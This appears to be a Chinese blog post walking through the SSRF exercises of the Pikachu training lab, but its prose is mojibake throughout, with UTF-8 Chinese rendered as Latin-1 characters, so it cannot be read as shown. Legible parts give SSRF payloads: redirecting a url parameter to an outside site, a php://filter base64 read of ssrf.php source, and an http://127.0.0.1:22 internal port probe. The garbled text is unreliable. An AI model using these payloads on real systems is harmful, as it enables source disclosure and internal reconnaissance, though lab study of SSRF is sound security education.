å¦‚æœä¸€å®šè¦é€šè¿‡åå°æœåŠ¡å™¨è¿œç¨‹å»å¯¹ç”¨æˆ·æŒ‡å®š(â€œæˆ–è€…é¢„åŸ‹åœ¨å‰ç«¯çš„è¯·æ±‚â€)çš„åœ°å€è¿›è¡Œèµ„æºè¯·æ±‚,åˆ™è¯·åšå¥½ç›®æ ‡åœ°å€çš„è¿‡æ»¤ã€‚

æ‰“å¼€ssrf(curl)ï¼Œç‚¹å‡»aæ ‡ç­¾ï¼Œæ˜¾ç¤ºä¸€é¦–è¯—ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F26778ed40f9f4824a946a6d3c8fc0ffb.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBA5ZC-6KiA6YGT%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F745b95f2ca0446ae8b52df8a558168d4.png)-
çœ‹åˆ°è¿™ä¸ªurlæ²¡æœ‰ï¼Œä¼°è®¡å°±æ˜¯è¿™ä¸ªurlå¯¼è‡´çš„è·³è½¬ï¼Œæˆ‘ä»¬è¾“å…¥https://www.baidu.comå¯ä»¥å‘ç°ç™¾åº¦è¿‡æ¥äº†-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fced122e7ae7e4c9792984396b965b16e.png)-
æ‰“å¼€ssrf(file\_get\_content)ï¼Œåæ­£éƒ½è¯»äº†,é‚£å°±åœ¨æ¥ä¸€é¦–å§ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F0623aaeaaca74e20ad91052b7ebea0f1.png)-
åŒæ ·å¯ä»¥ä¿®æ”¹æˆç™¾åº¦ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F1c5793b37223459fa425a5fd8474d1ba.png)-
è¯»å–PHPæ–‡ä»¶çš„æºç :`php://filter/read=convert.base64-encode/resource=ssrf.php`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe1bbe6ec59e54f6b86b768e9f0ce44fe.png)-
ç¼–ç å½¢å¼è½¬æ¢å³å¯ã€‚-
å†…ç½‘è¯·æ±‚:http://x.x.x.x/xx.index-
eg:-
payloadï¼šhttp://127.0.0.1:22(æ¢æµ‹è¿™å°ä¸»æœºå†…ç½‘çš„è¿™å°ä¸»å¥çš„22ç«¯å£æ˜¯å¦å¼€å¯)

## å‚è€ƒèµ„æ–™

Webå®‰å…¨ä»å…¥é—¨åˆ°æ”¾å¼ƒï¼šhttps://www.ichunqiu.com/course/63838-
çš®å¡ä¸˜é¶åœºï¼šhttps://github.com/zhuifengshaonianhanlu/pikachu-
w3school HTML DOM:https://www.w3school.com.cn/js/js\_htmldom.asp

[æŸ¥çœ‹åŸç½‘é¡µ: blog.csdn.net](https://blog.csdn.net/qq_53571321/article/details/121692906)






# Quote
